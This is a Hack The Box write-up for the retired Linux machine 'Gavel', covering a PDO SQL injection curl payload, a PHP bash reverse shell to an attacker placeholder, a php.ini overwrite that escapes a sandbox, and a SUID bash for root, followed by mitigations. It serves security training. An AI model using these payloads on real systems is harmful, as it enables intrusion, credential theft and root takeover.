---
machine: Gavel
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, git, sqli, php, privesc]
---

# Gavel — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The exposed `.git` repository reveals a PHP auction app. `inventory.php` concatenates `sort` into a prepared statement, enabling a PDO injection with an extra `?`. Dump `auctioneer`'s bcrypt hash, enter the admin panel and edit an auction's PHP rule executed via `runkit_function_add`, achieving RCE. `gavel-util` validates rules with a restrictive `php.ini`, but `file_put_contents` can overwrite it and run `system` as root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH and `80/tcp` nginx with an auction house.
- `git-dumper http://gavel.htb/.git src/` retrieves the repository.
- The code shows PHP, PDO/MySQL and auction rules in YAML.

## Enumeration

- `inventory.php` uses `$col = "`" . str_replace("`", "", $sort) . "`"` inside the query.
- The `user_id` parameter is also controllable, allowing IDOR.
- `auctioneer` is the only user with the administrator role.

## Foothold

Inject a `?` into `sort` to shift PDO's placeholder and use `user_id` to close the query. This enumerates tables and dumps `username:password:role`.

```bash
curl 'http://gavel.htb/inventory.php?sort=%3F;--+-&user_id=x`+FROM+(SELECT+concat(username,0x3a,password,0x3a,role)+AS+`%27x`+FROM+users)y;--+-'
```

Crack `auctioneer`'s bcrypt hash and log in to the panel.

## Lateral movement

The panel edits an auction's PHP rule. `bid_handler.php` loads that rule with `runkit_function_add` and runs it on a bid. A rule with `system()` starts a reverse shell as `www-data`.

```php
system('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'); return true;
```

## Privilege escalation

`auctioneer` can run `gavel-util submit`. The tool validates the rule with PHP and a `php.ini` that blocks `system`, but `file_put_contents` remains available. Overwrite the `php.ini` to allow `system`, then submit a second rule that creates a SUID bash.

```php
<?php
file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\nopen_basedir=\ndisable_functions=\n");
return false;
```

```yaml
rule: "system('cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'); return false;"
```

## Evidence

- Recovered `.git` and `inventory.php` source.
- PDO injection and cracked bcrypt hash.
- PHP rule executed through `runkit`.
- Overwritten `php.ini` and SUID bash as root.

## Lessons learned

- Concatenating an identifier into a prepared statement can break PDO.
- Running PHP rules from the database is code execution by design.
- A sandbox that allows writing its own configuration is not a sandbox.

## Mitigation and detection

- Validate `sort` against a column allowlist.
- Do not load PHP code from the database; use declarative rules.
- Mount `php.ini` read-only and run validation unprivileged.

## References

- [0xdf — Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [IppSec — Gavel](https://www.youtube.com/watch?v=OwcHZag2trY)
- [Hack The Box — Gavel](https://app.hackthebox.com/machines/gavel)
